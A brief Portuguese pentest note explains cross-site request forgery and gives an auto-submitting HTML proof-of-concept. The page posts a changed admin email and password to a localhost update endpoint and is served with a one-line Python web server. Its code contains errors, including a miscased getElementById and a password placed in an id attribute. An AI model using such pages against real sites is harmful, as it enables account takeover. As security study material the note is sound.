# CSRF

Cross-site request forgery&#x20;

Induzir uma vitima a acessar um site e realizar uma requisição com o navegador dela

{% code title="attack.html" overflow="wrap" lineNumbers="true" %}
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>test</title>
</head>
<body>
    <form action="http://localhost/?action=update" method="post" id="form">
        <input type="email" name="email" value="admin@admin.com">
        <input type="password" name="password" id="admin@123">
    </form>
    
    <script>
        document.getElementbyId('form').submit();
    </script>
    
</body>
</html>
```
{% endcode %}

`python -m SimpleHTTPServer 8888`

Automaticamente quando a vitima acessar a URL, será enviada uma requisição POST
